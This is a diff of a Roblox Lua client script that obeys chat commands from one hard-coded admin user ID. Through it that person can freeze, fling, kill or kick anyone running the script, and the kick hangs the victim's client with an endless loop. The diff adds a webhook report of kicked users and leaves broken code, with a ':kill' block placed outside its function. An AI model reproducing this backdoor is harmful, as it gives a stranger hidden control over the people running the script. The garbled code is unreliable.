@@ -1,8 +1,11 @@
 local player = game.Players.LocalPlayer
+
 local Players = game:GetService("Players")
+
 local Admins = {
     2200043156, --Airsoft
 }
+
 local function commands(msg, plr)
     if table.find(Admins, plr) then
         local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
@@ -14,13 +17,7 @@ local function commands(msg, plr)
             if string.find(SplitCMD[1], ":freeze") then
                 player.Character.HumanoidRootPart.Anchored = true
             end
-            if string.find(SplitCMD[1], ":freeze .","all") then
-                player.Character.HumanoidRootPart.Anchored = true
-            end
             if string.find(SplitCMD[1], ":unfreeze") then
-                player.Character.HumanoidRootPart.Anchored = false
-            end
-            if string.find(SplitCMD[1], ":unfreeze .","all") then
                 player.Character.HumanoidRootPart.Anchored = false
             end
             if string.find(SplitCMD[1], ":users") then
@@ -29,10 +26,6 @@ local function commands(msg, plr)
             end
             if string.find(SplitCMD[1], ":fling") then
                 player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-            end
-            if string.find(SplitCMD[1], ":kill") then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer.Character.Humanoid.Health = 0
             end
             if string.find(SplitCMD[1], ":scare") then
                 function Scare()
@@ -73,21 +66,27 @@ local function commands(msg, plr)
                 end
             end
             if string.find(SplitCMD[1], ":kick") then
-                local ISADMIN = table.find(Admins, player.UserId)
-                if not ISADMIN then
+                local ADMIN = table.find(Admins, player.UserId)
+                if not ADMIN then
                     player:Kick("Kicked.")
+                    Webhook(player, "USER KICKED!")
                     wait(5)
                     while true do
                     end
                 end
             end
         else
-            if string.find(msg, "/e users") then
+            if string.find(msg, "/users") then
                 game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SoftVortex on Top", "All")
             end
         end
     end
 end
+            if string.find(SplitCMD[1], ":kill") then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            end
+
 Players.PlayerAdded:Connect(
     function(plr)
         local ADMINS = table.find(Admins, plr.UserId)
@@ -100,6 +99,7 @@ Players.PlayerAdded:Connect(
         end
     end
 )
+
 for i, v in pairs(game:GetService("Players"):GetChildren()) do
     local ADMINS = table.find(Admins, v.UserId)
     if ADMINS then
